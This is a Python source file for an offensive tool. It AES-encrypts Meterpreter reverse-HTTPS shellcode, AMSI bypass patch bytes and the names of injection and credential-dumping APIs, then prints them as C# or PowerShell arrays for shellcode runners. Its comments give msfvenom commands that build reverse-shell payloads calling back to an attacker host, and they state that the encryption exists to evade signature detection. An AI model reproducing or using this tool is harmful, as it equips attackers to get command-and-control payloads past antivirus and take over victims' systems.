from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from os import urandom
import argparse

# ------------------
# AesEncryptor.py 
# ------------------
# This helper program will print various api names, x64 & x86 shellcode, a key and an IV using Aes256 CBC Encryption for use with NetRunners C# or AES Encrypted PowerShell Shellcode Runners.
# Author: @gustanini (Rafael Pimentel)
# Hacker Hermanos: https://linktr.ee/hackerhermanos

# ------------------
# Instructions
# ------------------
# Generate your x64 payload, save as buf in configuration section below: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.0 LPORT=443 EXITFUNC=thread -f python
# Generate your x86 payload, save as buf86 in configuration section below: msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.0 LPORT=443 EXITFUNC=thread -f python
# Run this program selecting your desired format (currently csharp or powershell).

# ------------------
# Functions
# ------------------
class Encryptor:

    # generate aes initialization vector 16 byte
    @staticmethod
    def generate_iv_aes():
        return urandom(16)
    # generate aes key 32 byte
    @staticmethod
    def generate_key_aes():
        return urandom(32)
    # aes encryptor: 256CBC, PKCS7 padding
    @staticmethod
    def encrypt_bytes_to_bytes_aes(plain_bytes, aes_key, aes_iv):
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(aes_iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(plain_bytes) + padder.finalize()
        encrypted = encryptor.update(padded_data) + encryptor.finalize()
        return aes_iv + encrypted

    # ------------------
    # POWERSHELL PRINTER
    # ------------------
    # printer, outputs to powershell format
    @staticmethod
    def to_powershell_byte_array(byte_data):
        return ', '.join(f'0x{b:02X}' for b in byte_data)
    # print in powershell format
    @staticmethod
    def print_powershell():
        # print key, IV
        print(f"[Byte[]] $AesKey = {Encryptor.to_powershell_byte_array(aes_key)}")
        print(f"[Byte[]] $AesIV = {Encryptor.to_powershell_byte_array(aes_iv)}")
        
        # print encrypted data
        # x64 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(buf, aes_key, aes_iv)
        print(f"[Byte[]] $buf = {Encryptor.to_powershell_byte_array(encrypted_data)}")         

        # x86 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(buf86, aes_key, aes_iv)        
        print(f"[Byte[]] $buf86 = {Encryptor.to_powershell_byte_array(encrypted_data)}")       

        # amsi patches
        for patch_name, patch_bytes in AMSI_PATCH_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(patch_bytes, aes_key, aes_iv)
            print(f"[Byte[]] ${patch_name} = {Encryptor.to_powershell_byte_array(encrypted_data)}")

        # api names
        API_NAME_MAP["AmsiSb"] = "AmsiScanBuffer".encode() # add amsiscanbuffer as "AmsiSb" to avoid sig detection

        for api_name, api_bytes in API_NAME_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(api_bytes, aes_key, aes_iv)
            print(f"[Byte[]] ${api_name.replace('.', '')}_Bytes = {Encryptor.to_powershell_byte_array(encrypted_data)}")

    # ------------------
    # CSHARP PRINTER
    # ------------------
    # printer, outputs to csharp format
    @staticmethod
    def to_csharp_byte_array(byte_data):
        return ', '.join(f'0x{b:02X}' for b in byte_data)
    # print in csharp format
    @staticmethod
    def print_csharp():
        # print key, IV
        print("public static byte[] AesKey =" + "{" + f"{Encryptor.to_csharp_byte_array(aes_key)}" + "};")
        print("public static byte[] AesIv =" + "{" + f"{Encryptor.to_csharp_byte_array(aes_iv)}" + "};")
        
        # print encrypted data
        # x64 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(buf, aes_key, aes_iv)
        print("public static byte[] buf =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # x86 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(buf86, aes_key, aes_iv)        
        print("public static byte[] buf86 =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # print unencrypted buf sizes (encrypted buf size is different)
        print(f"public static int sBuf = {len(buf)};")
        print(f"public static int sBuf86 = {len(buf86)};")

        # amsi patches
        for patch_name, patch_bytes in AMSI_PATCH_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(patch_bytes, aes_key, aes_iv)
            print(f"public static byte[] {patch_name} =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # api names
        API_NAME_MAP["AmsiScanBuffer"] = "AmsiScanBuffer".encode() # add amsiscanbuffer for use with netrunners
        for api_name, api_bytes in API_NAME_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(api_bytes, aes_key, aes_iv)
            print(f"public static byte[] {api_name.replace('.', '')}_Bytes =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

# ------------------
# Configuration Section
# ------------------

# paste x64 buf here
buf =  b""

# paste x86 buf here as buf86
buf86 =  b""

# amsi patches dictionary
AMSI_PATCH_MAP = {
    "AmsiPatch" : bytes([0xb8, 0x34, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3]),
    "AmsiPatch86" : bytes([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]) # this unencrypted payload is flagged
}

# api names
API_NAMES = [
    "VirtualAlloc",
    "VirtualProtect",
    "CreateThread",
    "WaitForSingleObject",
    "VirtualAllocEx",
    "WriteProcessMemory",
    "CreateRemoteThread",
    "OpenProcess",
    "GetCurrentProcess",
    "FlsAlloc",
    "VirtualAllocExNuma",
    "CreateProcessA",
    "ZwQueryInformationProcess",
    "ReadProcessMemory",
    "ResumeThread",
    "LoadLibraryA",
    "GetStdHandle",
    "MiniDumpWriteDump",
    "amsi.dll",
    "NtTraceEvent"
]
API_NAME_MAP = {api: api.encode() for api in API_NAMES}

# ------------------
# Main Function
# ------------------
# Define a main function to handle argument parsing
def main():
    # Create the parser
    parser = argparse.ArgumentParser(description="Encryptor Script")
    # Add arguments
    parser.add_argument("-csharp", action="store_true", help="Print the output in C# format.")
    parser.add_argument("-powershell", action="store_true", help="Print the output in PowerShell format.")

    # Parse the arguments
    args = parser.parse_args()

    if args.csharp:
        Encryptor.print_csharp()
    elif args.powershell:
        Encryptor.print_powershell()
    else:
        Encryptor.print_powershell()

if __name__ == "__main__":
    # generate keys
    aes_key = Encryptor.generate_key_aes()
    aes_iv = Encryptor.generate_iv_aes()
    
    main()

# ------------------
# To-Do
# ------------------

# add -c format
# add -vba format (decimal)
# refactor functions to make them more efficient/flexible